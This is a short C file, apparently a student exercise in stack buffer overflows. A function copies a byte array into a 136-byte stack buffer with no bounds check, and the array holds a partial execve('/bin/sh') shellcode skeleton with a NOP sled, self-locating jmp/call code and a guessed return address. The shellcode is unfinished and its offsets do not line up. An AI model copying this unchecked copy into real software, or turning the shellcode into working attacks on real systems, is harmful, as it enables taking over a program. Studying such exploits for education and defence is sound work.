#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

void doTest();

int i;

int main(int argc, char * argv[]){

        
    putenv("MD5=8b7588b30498654be2626aac62ef37a3");

    /* call the vulnerable function */
    doTest();

    exit(0);
}

// VAriable to contain hex bytes of shell code
char compromise[159] = {
0x90,0x90,0x90,0x90, // nops
 // more nop
// ; find out where we are
0xEB, 0x4F, // start: jmp codeEnd
0x5E, // start2: pop rsi

0xE8,0xAC,0xFF, // codeEnd: call start2
0xFF,0xFF, //
0x2F,0x62,0x69,0x6E, // exeStr: db "/bin/shX"

// return address
0xff,0xff,0xff,0xff,
0xff,0x7f,0x00,
};


// string variable to probe the stack and find the correct

// address of env var = 0x7ffff7fbe600
// values for the shell code.
char * compromise1 =
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxxxxxxxxxxxxxxxxxx"
    "xxxx"
    "MNOPWXYZ" //0x4D4E4F505758595A
    "xxxxxxxx";

    //size is 160

void doTest(){
    char buffer[136];
    /* copy the contents of the compromise
       string onto the stack
       - change compromise1 to compromise
         when shell code is written */
    for (i = 0; compromise[i]; i++){
	buffer[i] = compromise[i];
    }
}

